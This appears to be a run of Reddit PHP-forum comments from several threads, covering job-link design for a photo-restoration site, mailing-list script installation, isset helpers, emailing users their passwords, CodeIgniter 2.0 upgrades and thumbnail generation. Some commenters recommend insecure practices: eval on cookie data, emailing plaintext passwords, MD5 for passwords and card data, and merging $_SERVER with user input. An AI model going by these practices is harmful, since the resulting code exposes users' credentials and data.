Yeah, I had a feeling that it was too vague and generalized. I was hesitant to post this because I feel I'm asking a lot and probably underestimating the complexity. I'm doing this just to give myself a project to learn PHP, which, right now, I only have a basic knowledge of. I don't know OO either and haven't used a framework. Just trying to learn basic PHP programming and database querying. The site allows people to upload a damaged, discolored, etc photo that I'd restore and send back to them. So I'd like the user to upload a photo and I'd be notified of the upload via email. I'd then pull the image off the server, fix it in photoshop and put the new file on the server. The user would then be notified, again via email, and sent a link to a page that would allow them to pay for the photo and receive a download link. I've created user account creation before so I'm familiar with cookies, sessions, etc. But ideal, people I'd like it so that people wouldn't have to create accounts. I'd like it to be as quick and convenient as possible. Plus, I don't expect many repeat customers (or many customers at all, for that matter). I was thinking that I could store a password for each job_id and supply that to each customer so that they could 'log into' their job. I'm aware of auto_increment and thought that's how I may set up my customer ids. I know that I need to plan this out better, but I'm not really sure how so I was hoping to bounce thoughts/ideas off people. It's a great way to learn, but I don't know of any web devs IRL that I could talk to.
ok that clears up a lot of things. Now on to the advice.... You can learn a framework like kohana or a cms like joomla, drupal etc. but to learn try raw php first. I'll try to break it down into small parts and point you to various tutorials to get you going. Also instead of a password just have a unique job_id plus a "verify" field so people can't access the job by guessing job_ids. i.e. ?job_id=55678&amp;verify=dfjlkg66g76k4 where verify would be a randomly generated string that you pair up with the unique job_id, so verify would have it's own column in the jobs table. Section 1: User management [How to Build a Login System for a Simple Website](http://net.tutsplus.com/articles/news/how-to-build-a-login-system-for-a-simple-website/) After your login system is up and running all you do is check that the user is logged in and that he has permission to view the page. [User Membership in PHP](http://net.tutsplus.com/tutorials/php/user-membership-with-php/) Section 2: Uploading files [Uploading files with a PHP script](http://www.developer.com/lang/php/article.php/1456041/Uploading-Files-within-a-PHP-Script.htm) Section 3: sending e-mail [Sending E-mail with attachments](http://scvinodkumar.wordpress.com/2008/07/14/php-sending-email-texthtmlattachments/) You would send the unique link in the e-mail. Then make sure to give them the ability to delete the job after they have retrieved their file. This way you can avoid sign ups.
Do you really need a 14 character file name? If not, PHP has a function that will generate unique, random string ([uniqid](http://php.net/uniqid)). As for teh unique ID of client/job - use an AUTO_INCREMENT field, yes. If you wish to send the clients links that would execute some action but not require them to login, I'd sugest you use a hash - every record in the DB should be described with its ID and a hash computed from the ID and salt, just like password. Then, you could send the link mysite.com/order.php?job_id=01272011015787&amp;hash=the-hash-goes-here and validate if the hash is correct for given job ID.
To add to McGlockenshire's response, check the documentation (if exists) or the code itself on how your particular CGISESSID cookie is being set. Likely you can reproduce the code in PHP to end up with the exact same cookie, which will then give you insight into how to form your PHP script to reuse it for your own authentication. Side note: For an example on tagging along with another authentication system used elsewhere on one's server, (even though it's a PHP vs PHP example) with wikimedia authentication, a user's stored password value in the Mysql table is (or was just a few years ago) `MD5(CONCAT($user_id, '-', MD5('$password')))`. With that formula, one can reuse or improve upon authentication against a single user account across multiple applications installed on one's server.
Thanks for your hint, that's interesting. We have found the file containing the cookies parameters and we parse them with php. I don't really know a way to store them in a DB but it's fine like this. We are able to parse all the informations from the cookie file, actually, we just eval the array that's in there and it works like a charm :)
&gt; DataMapper style model synchronisation With PHP? Could you give some details? Did you roll your own?
You'd query the user_skill table with the skill_ids you're looking for, and then JOIN the user table against the user_id column in user_skill: SELECT u.* FROM user u, user_skill us WHERE us.skill_id IN (1,2,3,4) AND u.user_id = us.user_id
Yes, we do use our own implementation but it's fairly straightforward. Here's the approach: Define properties on the model and link them to field types. something like: $this-&gt;add_property("name", "TextField", array() ); $this-&gt;add_property("email", "EmailField", array() ); first val is field name, second is field type (we use a class so that we can add loads of extra behaviour but these could just map directly to mysql column types), third is an array of options - things like default values etc. So every version of your model has the info needed to create a database structure. Then you just need to sync this structure to the database - first up you need a sql class that can create tables, add columns and ater columns. What we do to make it automatic (non-destructively of course) is wrap the pdo query in a try catch block, if it throws an exception and the exception is, table / column doesn't exist, then run the sync method. Hope this helps.
&gt; MySQL has an AUTO_INCREMENT function FTFY
Thank you, I can still use all the help I can get! 
don't hesitate to ask more. I am developer of this thing :) Freshly registered discussion google-group: http://groups.google.com/group/aip-php-dev/
If you don't want duplicate filenames, then don't use an algorithm that *could* produce duplicate filenames. Wishful thinking wrt the random number **will** fail at some point. The same random number in the same second, more than once? Easy.
&gt; ...learn &amp; use a decent framework... Pop quiz: which word above suggests a way in which the OP can prepare for this eventuality?
Learning how to use an application whose main purpose is to abstract away the intricacies of the language without being very familiar with said language is Not A Good Idea.
It's possible, I've suspected the same thing about this subreddit for awhile. I actually took it off my front page last week and my Reddit experience has improved :)
Thank you. This helps a LOT. I like the idea of 'verify' as a sort of password. I think that's how I'll do it. I already have all the PHP written (everything minus user login). But the file upload and email scripts are up and working (with validation, file type checking, and security like mysql_real_escape_string, etc). I'm happy that everything's working so far. Everything except the database structure. That's next. Anyway, asking here helped a ton. I really appreciate it. Great link for Building a Login System. That's great to know!
Cool! It's nice to know that working with a framework doesn't necessarily require OO knowledge. I get the whole concept of classes, objects, etc. And I have a basic understanding the MVC structure and how it works, so that will help a lot. But just like you, as soon as I see -&gt; and ::, etc, I'm somewhat lost. I can usually figure out what's happening, but writing it is a different beast. Maybe I'll look into CodeIgnitor or something similar. Thanks for the advice!
It appears you've bought a web application. In other words, it needs to be installed and run from a web server via your browser. You will need web hosting and a mySQL server to run it. 
I don't know how to reply to this... because that script looks piece of cake to install. It's a web application. Of course there are only php, html, css, sql, and gif files included. I'm sure the software works fine. You might be able to ask for a refund via PayPal, but it says all sales are final, and for good reason! You now have the source code. It isn't his fault you didn't read the technical requirements: &gt;SiMpLe requires you to have one MySQL database, PHP 4 or greater installed on your server, and access to upload files and set permissions. Not only that, it says you can contact him at help@simplemailinglist.com.
That's what I'm afraid of. I don't expect many orders (job_ids), so it shouldn't be an issue, but I'd rather have it done correcly the first time. I also don't want to form bad habits this early in the game (which is one reason I posted this). Any suggestions on creating a truly random and unique number? Perhaps using uniqid()?
To run a php webscript you need LAMP/WAMP/whatever stack. Basically you need an operating system (W)indows or (L)inux Then you need a web server (A)pache is most commonly used You possibly need (M)ySQL database engine to store data and lastly you need (P)HP to process the php scripts and pass the info back to your webserver Once you have all this running you will need to configure your server to run the PHP scripts that you have downloaded
Yeah, the requirements are pretty clear "SiMpLe requires you to have one MySQL database, PHP 4 or greater installed on your server, and access to upload files and set permissions." If you're "technically retarded" you could probably afford to ask a few more questions before buying things you don't understand then accusing an honest person of ripping you off.
Yeah... tried emailing that address a few times, delivery failed every time. 
Yeah, ideally the file name would be smaller than 14 characters. That's a little much. And I was unaware of uinqid()... I'll check it out. Also, great idea using a hash. I planned on generating a second unique string for under each job in a *verify* field. Then the link would be: mysite.com/order.php?job_id=01272011015787&amp;verify=dInad5fbU8 That way, people can't just guess a job number, as suggested by someone else here. Hash is probably a great way to do this. Thanks a lot for the advice!
**Misleading headline!** You seem to be blaming the programmer when you should be looking at yourself. You bought something that you didn't understand. Hire someone to do it for you if you don't know what you are doing. His email is right there on the website: help@simplemailinglist.com. The instructions on the website self explanatory. FYI: It's a php script that you install on your server, it won't have a .exe or .dmg extension (it could but, but in practice it doesn't happen).
&gt;Well I downloaded it and there's not a single .dmg (or .exe) file in it, only php, html, css, sql, and gif files That's exactly what you would expect. What you bought is designed to run off a web server and not locally. You need to setup a web hosting account (PHP/mySQL) and upload the files there. Have you read the instructions?. 
&gt; then accusing an honest person of ripping you off. I didn't mean to accuse him, I realise now that my title sounds like it, but I didn't mean to. I was exaggerating when I said I was "technically retarded" by the average person's standard I'm very technically savvy, by Reddit's standard I'm probably average or a bit below, by this subreddit's standard I am "technically retarded". So honest question then if you don't mind, how long's it gonna take me to figure this out? Blast wix.com for making ordinary Joe's like me think they can build websites! 
I doubt it. I just e-mailed them this morning.
Ok so I'm feeling quite a bit of hate already, sorry for bothering you guys with such a stupid issue, and sorry Jared, if it sounds like I'm accusing you, I'm just a little frustrated that my emails aren't getting through to you. Is there a kind soul here who wants to educate a n00b like me and walk me through it? I'm the kind of guy who prefers to learn how to do things myself rather than just pay someone else to do it for me; partly cuz I can't afford to pay anyone and partly cuz I think it gives me a greater appreciation for what people like yourselves do.
Don't worry, we'll help you if you fix your post. Honestly, have you even read the README file that was probably in the zip or whatever? It usually goes a little like this: 1. Copy everything to your web server 2. Go to http://yourserver.whatever/whereveryouputit/install.php 3. Follow the instructions Often there is a step in there where you import your .sql file into a fresh database on MySQL, but sometimes the installer will do it for you.
&gt;Then make sure to give them the ability to delete the job after they have retrieved their file. This way you can avoid sign ups. I'm don't really follow here. Why delete old jobs? I was planning on having a 'job_status' field with values to represent different stages of the job like *image uploaded*, *quote sent*, *job complete*. That way I have a record of all jobs, whether they've been completed or not.
Just get a domain name and get a cheap hosting account and play around. That way the hosting companies support centre will help you setup. COM domains are cheap and hosting is around $5 a month. There is even a hosting company that only charges you for traffic so you could even pay less around $1 a month (can't remember the name though). You would need to know how to FTP as well
Tried to change the title. I can't. I put an edit at the bottom though. Yeah, the first thing I did was open the README. It's a UNIX executable file so it's opened with Terminal. I'm on a Mac btw, (I know, i know). Here's what I'm trying to do and what I've done so far: * Built a simple little website on wix.com * Wanted to make a mailing list so I found SiMpLe * Thought I could just embed the script onto the page like HTML * It's hosted by Network Solutions 
Thanks man. My website is hosted by Network Solutions. Should I try to contact their help centre?
Find out what plan you are on. Chances are you already have php/mysql included. If you have a website, just ftp the code up to a test directory. Also play around with phpmyadmin (or equivalent, just ask support what they use for mysql admin). EDIT - [yeah you got it](http://www.networksolutions.com/web-hosting/language-support.jsp). Just call them and they will step you through it. Just read the instructions in case there are some sql scripts that you have to run (via phpmyadmin) to initialise the database. You may not even need to use phpmyadmin, as I am sure there is probably an install.php that does it for you. Still it is a good idea to just have a play.
Check out the builtin PHP function [parse_str](http://php.net/manual/en/function.parse-str.php)
This is the PHP subreddit. Your posting has nothing to do with PHP.
This is an approach that I used to create a database controller: Class 1 handles the actual database interaction. It has methods like 'connect', 'performQuery', .. and handles everything that goes in or out of the database. Class 2 creates the actual query strings, checks for 'evil' input and forwards the calls to class 1. It is too much to go into detail, but instead of creating one class for each table, this would allow a more general approach. Check out the 'ActiveRecord' class' API from the framework CodeIgniter to get an idea of what I mean and fetch some inspiration of what is possible: http://codeigniter.com/user_guide/database/active_record.html I would advise you though not to create table specific db handlers. Say that you have your 'createUser' method in your db handle, you could as well add that single line of query code into your actual user handling class instead of creating a seperate class for it. In my experience a seperate table class does not pay off. Of course, you need to figure out a solution which fits best for your purposes.
It's not a UNIX executable file, it just doesn't have a file name extension. Open it up in some sort of text editor.
This does what your description specifies: $data = $_GET; If you just want a cleaner isset syntax: function set_if_set($from, $variable, $default, $to) { if (isset($from[$variable])) { return $to[$variable] = $from[$variable]; } else { return $to[$variable] = $default; } } $data = set_if_set($_GET, 'variable', '', $data); I'm sure there's a much cleaner way to do that. Abstracting this away even further using a list of variable names and a foreach loop is left as an exercise for the reader.
Thanks again. When i said "My website is hosted by Network Solutions." I meant to say: I've purchased the domain name and email hosting from them, and I've pointed the domain name to it. My website is actually hosted by Wix. I've looked on their help forums and it looks like they don't support PHP but one of their devs said this: "the user can load his own php file to his own server and a contact form he made on his own that talks to this php to his wix account." So, should I go to Network Solutions and buy a nsHosting Shared Package like you linked to and then try to get them to help me through it? 
First, use array_key_exists(). Second, here's my function: https://gist.github.com/800511 Used like this: $value = find_value('key', 'default_value', $_GET, $_POST, $_SERVER); What it does is cascade the searches. If it can't be found in $_GET, it searches $_POST, and if it's not in $_POST, than $_SERVER and finally returns the default value. It will also cast the value found to the same type that the default value is. Edit: Also works with searching objects for public properties.
Thanks.
edit: Nevermind... It's been awhile since I've looked at parse_str and forgot about the second param. Good advice.
I cant get wix.com to load (all I get is a spinning yellow circle). Is it like wordpress or something?. The cheapest package is $10 which is not too bad. How much are you paying now for email? (that will be included in the $10)
Ohhhh, it's a "build a free flash website" type of service. Now I can see why they might not want someone to run their own code. Here's what you need to find out about wix before we can help you install this code. Perhaps their help forums will be useful, as I don't know anything about wix: 1) How do I FTP into wix to upload files. 2) If I upload a .php file, what URL will I use to access it at the browser. (NOTE: This could be as easy as uploading test.php and being able to hit it at http://mydomain.com/test.php). The answer to this question will give someone the opportunity to say "you cannot upload your own files, this is free flash bullshit.") 3) What are my MySQL connection parameters, and how do I create a new MySQL database. (Again, someone is likely to say "hey ahole, this is free flash hosting, no mysql databases are possible) Once all of those are done, we can help you get these files onto your server to access them. If you can't get php/mysql on your wix hosting, you can always try [hostgator's hatchling plan](http://www.hostgator.com/shared.shtml). you can sign up for yearly service, and cancel if you don't like it (IIRC), which makes it only $5 a month. 
Yeah Wix is a flash website builder for dummies. I only paid $29.99 for a year of email and domain name. Because I upgraded my Wix account to premium I got a HUGE discout from Network Solutions, who are one of their partners.
It's difficult to discern best practice with such a limited example. Can you provide some context?
I like that function, but.. 1) if the subject is an object that implements ArrayAccess, your function will attempt to retrieve a property. 2) if the subject is an object and you're attempting to retrieve a dynamic property, property_exists will fail and return nothing. and why are you casting the $result to the type of the $default argument? care to elaborate?
This is the best idea so far. A random alert would definitely get my attention.
What's the point of the randomness again?
It looks like you're trying to emulate Javascript. That's a very bad way to approach learning PHP, as Javascript is very dissimilar in terms of how it should be used. Creating wonky helper functions like that will make your code more difficult to read and edit.
This is a bad idea if you're actually using it to look up any values from $_SERVER; suddenly anyone can submit their own REMOTE_ADDR or other values originally provided from the SAPI that you originally could trust. You should know where your variables come from. filter_input might be able to help you, or you could use $_REQUEST if you really want to merge user supplied input into one array.
I have a static class I use for this called IsSetAnd. Usage looks like this: $data['variable'] = IsSetAnd::IsNumeric($_GET, 'variable'); or $data['variable'] = IsSetAnd::Equals($_GET, 'variable', $comparison); or $data['variable'] = IsSetAnd::GreaterThanZero($_GET, 'variable'); for example. Here is a list of included functions: * IsSetAnd::Equals * IsSetAnd::NotEmpty * IsSetAnd::IsNumeric * IsSetAnd::IsCtypeAlnum * IsSetAnd::IsCtypeAlpha * IsSetAnd::IsCtypeCntrl * IsSetAnd::IsCtypeDigit * IsSetAnd::IsCtypeGraph * IsSetAnd::IsCtypeLower * IsSetAnd::IsCtypePrint * IsSetAnd::IsCtypePunct * IsSetAnd::IsCtypeSpace * IsSetAnd::IsCtypeUpper * IsSetAnd::IsCtypeXdigit * IsSetAnd::IsArray * IsSetAnd::IsFilledArray * IsSetAnd::GreaterThanZero * IsSetAnd::GreaterThan * IsSetAnd::LessThan * IsSetAnd::GreaterThanOrEqualTo * IsSetAnd::LessThanOrEqualTo * IsSetAnd::True * IsSetAnd::False * IsSetAnd::UserFunctionIsTrue * IsSetAnd::MatchesRegex If your test passes, you get the value of the array key. If it fails, you get null. Also, the value of the array key is stored in the static variable IsSetAnd::$value so you can easily access it again if you need it. If the test fails, the static variable will hold null. I tried to upload it to phpclasses.net to share, but it looks like they will have a 5 day review period. Instead, I will link to a pastebin of it: http://pastebin.com/4DLwrAZ5 I hope this helps you and anyone else with this problem! edit: formatting edit: changed link to new &amp; improved class based on comments, also update list of function names
Just what i was looking for. Works great for me. Thanks.
You should contact the guy who helped you in the first place or atleast try to learn a little bit of php and fix it yourself.
Done and done. I know a little bit of PHP. I can follow along for the most part with what's going on here. I'm stuck with one little step. Thanks
The only thing I'm seeing though is that the tasks are a few levels deep with a parentID. The way the code stands now, it creates nested &lt;ul&gt;'s the way it should.
It would serve as a unique *job_id* (the db's primary key). I don't want to use AUTO_INCREMENT because I don't want users to be able to guess it. I'll also rename uploaded files to the random number to avoid duplicate file names.
You'll need to pull out the recursive call to generate_menu($key). Or just have another function: function one_depth_menu($parentID) { global $menu_array; $has_child = false; foreach($menu_array as $key =&gt; $value) { if($value['parentID'] == $parentID) { if($has_child === false) { $has_child = true; echo '&lt;ul&gt;'; } echo '&lt;li&gt;' . $value['taskName']; if($value['required'] == 1) { echo '&lt;span class="required"&gt;*&lt;/span&gt;'; } echo '&lt;/li&gt;'; } } if($has_child === true) echo '&lt;/ul&gt;'; } one_depth_menu(0); EDIT: I just wrote this out, no testing 
Not that I disagree, but I think he just meant to illustrate that his function will search through multiple arrays.
Seems to, although it might give people the wrong idea. :-)
If you don't want to delete them you can archive them. But the point is to prevent people from hotlinking to those images and wasting your bandwidth. You don't want people using you as an image host. Optionally you can also learn [how to prevent hotlinking using php](http://www.alistapart.com/articles/hotlinking/). But that's yet another thing you need to learn to do. I was merely suggesting a quick fix.
in the website it looks like he wants you to email him at help@simplemailinglist.com. if you have any questions. Have you tried emailing him through this email address? (it most likely forwards to his personal email account as it looks like he's a 1 man company). Generally though, this script won't be much use of you if you don't have any background in making websites. It's really meant to be sold to fellow developers as a way for them to save time on their projects. It's not an end consumer product.
Oh - I didn't even think of hotlinking issues. Thanks for pointing this out. Archiving is a good idea, maybe I'll do that.
Yeah, I mainly use it to get parameters from arrays without checking if they exist each time. Say you get a result set back and you want to get the user_id field: $user_row = $db-&gt;fetch_row(); $user_id = find_value('user_id', 0, $user_row); Now $user_id is guaranteed to be an integer because the default value is an integer.
I used superglobals, but I really wrote the function for any array (mostly ones you define, or that are returned from a database or something like that).
IMHO your code is a lot more legible and maintainable if you leave it in $_REQUEST (or $_GET or $_POST) until you are ready to do something else with it (i.e. store it in DB or whatever.) When you move it out of the global you obfuscate the source of the data. People who come by and deal with your code later are left having to figure out where $data was populated from, since it's an ambiguous variable name. If you leave the data in $_GET or $_REQUEST until you're ready to do something else with it, then it's immediately clear to anyone else that you are dealing with form input/args.
 $sql = "select username, password, email from usertable"; $st = mysql_query($sql) or die(mysql_error()); while ($row = mysql_fetch_assoc($st)) { $message = "Your username is '{$row['username']}' and password is '{$row['password']}"; mail($row['email'], 'Site login update', $message); }
You'd have to create a quick script (php would work) that selects all the users from the database and sends out an email to them.
Sounds like you still have a lot of learning to do, this should be a very simple task for somebody with even basic PHP/MySQL knowledge. Basic PHP script to loop through the database and send an email is all you need. This can not be accomplished with MySQL alone.
Whoa, THANKS! didn't know it was THAT easy!!! Thanks a tonne
I use pear so I can use SMTP authentication, so ill have a reliable way to send emails and ensure that they are receiving them. I like to use gmail as my SMTP server, it shows (on the online client in the sent folder), where the email was sent to. It makes it easier for debugging them. I have a class if you would like to use it. 
Please be careful about how you store passwords. I'm assuming you are pretty new at this from your post. Please read up on how to store passwords before you make any really bad mistakes!
You really shouldn't be emailing people their passwords. Instead you could email a reactivation link that is a one-time use thing. Why would they need their passwords sent to them anyway? Shouldn't they already have that information?
First thing that came to my mind, too. You shouldn't be storing passwords unhashed (or at the very least they should be encrypted). Right now, if someone gains access to all of the data it exposes your users to other security threats.
Exactly, though if I were you I'd limit the number you send in one go in case the script times out, or there is a limit to the amount of mail you can send in one go.
mail is a shit function, it will fail probably, google for a php mail class that will send headers as well.
You are a gentleman and a scholar. I wish I had more than just an upvote to give you. Thank you for taking the time to help and not patronise me. 
Oh, absolutely. Heck, you could even store them sequentially in blobs. I did that once because a client insisted on storing credit card info in a db. I ended up splitting it up into three chunks, md5-ing each chunk and then storing them as blobs (if memory serves).
please don't store passwords in plaintext in your database? 
Don't do if(isset.... If someone writes ?page= it will see it as page has the value of "" which makes it valid for this, instead do: if(!empty($_GET['variable'])) { $data['variable'] = $_GET['variable'] } so even if it is "" it won't see it as set.
No problem. If you end up having to pick up a real linux hosting account, feel free to fire me off a PM and I can help you work through any issues getting it up and running.
Hey guys, Yeah, I'm definitely new to all this. I'm learning... The passwords are stored as md5, so don't sweat! That being said, if I use something like crackanape's code: $sql = "select username, password, email from usertable"; $st = mysql_query($sql) or die(mysql_error()); while ($row = mysql_fetch_assoc($st)) { $message = "Your username is '{$row['username']}' and password is '{$row['password']}"; mail($row['email'], 'Site login update', $message); } I want the password to display properly, rather than as the md5 version. Where to I put a piece in the code that will echo the right text? 
okay - will do! thanks
they are in md5 :)
Doing that is definitely beyond me at this point. And no they don't have that information because this organization has never had an online portal before. So I have all the user information but had to create usernames/pass for each. Then I will email them all their username/pass to access the site. Saves me from setting up a registration.
Yeah I tried emailing him. It came back as "undeliverable" every time. :-( There's been a couple of kind people here who have said they would help me figure this whole business out so I'll just keep chugging away at it until I get it!
I wrote almost this exact thing for a video site awhile back. you can have it if I can find it, but I'm not even digging out CDs unless I hear from you. Call me. Edit: I mean.. not 'randomly generated unique filenames', but predicatable programmatic file names which can only be downloaded as a stream and not directly.. so the filename is hidden behind anything you want it to be. What I think you are missing bud is 'scope'. Not everything has to be unique, only in its scope. 
No, no. Leave the index on a predictable sequence, and just build the external interface around a non-primary key. For performance reasons, you want that key to be an auto_incrementor. If you have random filenames, why does it matter what the internal, non-exposed ID is, and why do you need an external ID other than the filename you're presenting under?
could use IsSetAnd::CTYPE_DIGIT
It's good that you are learning, but I would recommend kicking some of these bad habbits early! To answer your question: MD5 is a hashing algorithm. The difference between a hash and an encrypt function, such as AES, is that you can't decrypt it. This is actually preferred for storing passwords because there is generally no need to view them as they only need to be compared with user input for logging in. I would recommend what others have said. Make a verification link, but link them to a general "forgotten password" page first. When they enter their email address you create a unique and complex identifier (like a youtube video ID) and keep it stored in a MySQL table along with their user ID and an expiry time of about an hour. Then you email them a link with the unique ID included. I would help you along with the code but it's a little late here, so I recommend googling forgotten password scripts.
CI has absolutely great documentation, thats where I started out. I did eventually move on to Yii however - I just kept on running into roadblocks when doing anything reasonably complex in CI.
Feature set looks good. Curious to see how a site using the new Database Drive vs Models looks. Also interested in hearing initial thoughts, and how easy/difficult it is to migrate 1.7.x sites - if anyone has done so.
Thanks a tonne for the help! I didn't know that about MD5.. interesting. Got a new idea though... okay so, hear me out: There's some 450 people in this database. Part of the website lets them keep their address and phone number that we have on file up to date. So I want to avoid them having to re-enter this information, since I already have it in an excel spreadsheet. So what I could do is, plug the spreadsheet into the database via phpmyadmin, add a column for username, and have some sort of like, activation form, where they go and enter their email, and then their desired first password, and then its created and stored in the database. That means that the password row in the SQL table will be blank until they activate their username. So what I do is send each of them their unique USERNAME and a link to that form, where they input their username and first password. They can then login and all their details that I already have (i.e. address) are already stored for them. Does that sound like a good way to do it? Thanks a tonne!
Oh - I guess your right. &gt;If you have random filenames, why does it matter what the internal, non-exposed ID is It doesn't. &gt;why do you need an external ID other than the filename you're presenting under I guess I don't. I thought I would be easier to just use the primary key to identify both the job number and file name, but if an auto_incremented number is more efficient as a primary key there's no reason I can't do that. Thanks. There are a ton of things I've overlooked and posting this has helped a ton.
Thank you. I have most of the PHP already written. Pretty much everything besides the database is set up and working well. But after posting this thread, I'll have to rework some of it. It's not necessary, but if you've wrote something similar, taking a look at it would be nice. But if it's buried deep, it's not a big deal. Got your number and I'll give you a shout after the weekend. Thanks again for your help. &gt;What I think you are missing bud is 'scope'. Not everything has to be unique, only in its scope. If I understand what you mean, you're saying that I don't need unique file names, etc. Just one unique ID to reference files, etc?
No prob. I'm here for more help later, too.
&gt;Support for PHP 4 is gone, PHP 5.1 is now a requirement. Yeah!
I just updated the class to support the following: * Wrappers for all ctype functions * Ability to test against a regex * Ability to pass a callback function or an array(class, method) so you can use custom functions in your code easily http://pastebin.com/4DLwrAZ5
At first, migrating from a 1.7.2 site to a 2.0 was really difficult. Then 15 mins later, I noticed there was a page for upgrading from 1.7.2 to 2... So I loaded that up and got my site converted in about 20 mins. Aside from the changes that they listed, I also noticed that they changed uri_string(). It doesn't have the leading slash any longer, which screwed up my site permissions until I fixed it.
Oh yeah!! It's owwn, PHP 4, you just got SERVED!!!
What the... ?! CI 2.0 has finally been released? Next thing you know Textmate 2 will be available.
Please post a link to the page
See, you're making a call to 'setAssignmentName', but how does it know where to find it? How does it know what class 'setAssignmentName' is part of, since it's not part of the default php library? Do you see where I'm going with this?
yuppers. I knew it was something simple. Thanks!
I've converted over my apps to the reactor branch just recently, and it all looks the same in the official release, aside from a few folders... Converting my 1.7.2 apps over to 2.0 were pretty easy. Most of what I had to do was go through my various models and controllers, and make a couple small changes. Controllers and Models are now prefixed with CI_ to prevent namespace issues. class MyModel extends CI_Model { } And the constructor has changed to this: function __construct() { parent::__construct(); }
http://codeigniter.com/user_guide/installation/upgrading.html
Hmmm, nice, but I still don't regret at all that I moved to Kohana.
Thanks for sharing, really cool story. No one is upset that you've moved to Kohana. It's a nice framework, as is CI.
Are we allowed to talk about it?
They should of moved to 5.3... From what I saw the framework is still very procedural.
That's why I've moved to Yii.
Still feels like a PHP4 framework, though. Which means I won't be using it. Hah.
Can't say I have tried yii but I have my eyes on lithium. Hard to find a decent 5.3 framework
If only PHP had some kind of way to do namespaces...
Not many hosts support 5.3, so their choice made sense. If you want a 5.3 framework check out FuelPHP. 
I love codeigniter
Be sure to set MINIMUM_PERCENT to 100.
I started using CodeIgniter (first framework) about a month or 2 ago for a project I'm working on. Took me a week or 2 to get used to it &amp; I liked using it until I started getting into developing my UI elements. I've since put development on hold &amp; I've been moving my code over to Zend little by little.
I use kohana at work, and for smaller projects a very overkill. Although it is quite an awesome system.
And Duke Nukem Forever! 
I started with CodeIgniter before 2.0.0 which was just released (I started learning it a couple months back). I'm pretty comfortable with the framework now but I've started moving code over to Zend which in my opinion has some pretty shitty documentation but looks more promising in the long run.
Once lithium gets model relationships, I'm there. I use CakePHP quite a bit, so the jump to lithium seems minimal
I believe that's PHP 5.3, and a lot of people are still running PHP 5.2.
Why do you need a setter for a public static variable? I would ask your prof to justify the need for that.
http://www.phpdeveloper.org/
By the time it was all said and done, it took me about 30 minutes to bring the development branch of my site up from 1.7.2 to 2.0.0 and verify functionality. 
...comes out later this Spring.
Right around the Year of the Linux Desktop?
I spend my time lost in the [Forrst](http://forrst.com)
I'm on Forrst as well and aside from the quite infrequent interesting PHP post it's usually "Here's this unbelievably obvious thing that everyone already knows about", "Awesome! Have 100 'likes'!" (If you're wondering it's /-shawn on Forrst.
Yeah. ;) But seriously, for reals this time: http://www.amazon.com/Duke-Nukem-Forever-Pc/dp/B002I0JAJ2/
I Want To Believe™
The setting of that variable makes sense to me because it does some preg_match stuff to make sure it's the right kind of data. The getter, though, JUST returns the variable which [Google explicitly recommends we not do](http://code.google.com/speed/articles/optimizing-php.html"'See the section 'Avoid writing naive setters and getters'").
I'd also add http://www.planet-php.net/ to that.
What a pretentious "community". From the looks of it, it's more designers anyway. 
fuel is awesome
A huge number of developers hang out on irc.freenode.net. Join ##php (yes, two #) and #phpc
True¸
&gt; Hard to find a decent 5.3 framework Hard to find people to help code them.
Nah, let him have his fun. That is the way we all have learned the programming languages we know. :P
 public function getAssignmentName() { return ~~$this-&gt;~~self::$assignmentName; }
hey there. I found some problems with your instructions for the custom installation (I did not try either of the other two since that is not what I needed). Starting with your two lines from the readme file, my additions that make it work are underneath: Include the UberGallery style sheet in your page header: &lt;link rel="stylesheet" type="text/css" href="path/to/resources/styles/ubergallery.css" /&gt; Link above should read: &lt;link rel="stylesheet" type="text/css" href="path/to/resources/css/ubergallery.css" /&gt; in order to access the files as you included them with your installation - you did not include a "styles" folder, you included a "css" folder and this fixes that path. AND you forgot to include that one needs to put this in the head, also, otherwise the colorbox/jquery doesn't work at all: &lt;link rel="stylesheet" type="text/css" href="path/to/resources/css/colorbox.css" /&gt; &lt;script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="path/to/resources/js/jquery.colorbox.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(document).ready(function(){ $("a[rel='colorbox']").colorbox({maxWidth: "90%", maxHeight: "90%", opacity: ".5"}); }); &lt;/script&gt; **** Hope that helps. Now I'm off to go see if I can customize it to fit within my existing CSS and so on. THANK YOU for providing this. I think I finally have a solution that might work for my client's needs. :)
This. I'm simonify on there.
I don't have a lot of respect for a site for "designers and developers" when it [doesn't validate](http://validator.w3.org/check?verbose=1&amp;uri=http://forrst.com/) and [doesn't render properly in Chrome](http://i.imgur.com/SM91P.jpg).
Thank you for pointing out these corrections. I have made the changes and pushed them live. The corrected instructions can be found at http://www.ubergallery.net/#customInstall
It's meant to be pretentious. Its entire point of being invite-only is to keep the fucking annoying "How do I connect to mysql" posts out. And more "This is a really cool, new (albeit useless) way to look at PHP OOP (http://dhotson.tumblr.com/post/1167021666/php-object-oriented-programming-reinvented)"
Cache - in what way?
Generate thumbnails, then save them and serve those images. Instead of regenerating the thumbnail each time.
Oh, right, of course. Everything gets gen'd then sent to S3
convert and imagemagick. better. system power is always greater than php power. 
For high load systems you'd typically farm your image resize / thumbnail generation requests out to separate worker threads using a message queue. [Gearman](http://www.gearman.org/) is a very simple implementation of such, allowing you to run any number of workers (that do the actual resizing) that response to calls from your client (web server). This allows you do offload any work in an asynchronous manner from the web server itself, allow the web server to continue serving requests while the work is performed somewhere else (or in a smaller setup; in another process on the same server). Increasing the capacity of your resize pool would be as simple as adding new workers to the message queue, either running on the same server or by adding new workers on new servers. Scales nicely. There are a large number of message queues available, where the implementations have different goals and focus. GD or Imagick would be fine for doing the job resizing job itself.
+1 for gearman. Farming out image handling was one of the original tasks it was designed for.
Nobody said local user groups yet, so: [local user groups](http://www.phpusergroups.org/). Lots of learning, sharing, and occasional attempts at fun team projects and bughunts (as opposed to trolls, spammers, and occasional attempts at crucifixion). And the ZCE group on Linkedin has good moments, when it isn't all "hi hi hire me" noise. 
You could off-load the work entirely to a service like [Transloadit](http://transloadit.com/). They handle the upload, thumb-nailing, and storage to S3 through a simple API. For a high-load site, finding a way to off-load something like image processing might be a good solution.
This is what I was planning to on the command line. I guess it'd be OK to spawn a bunch of processes
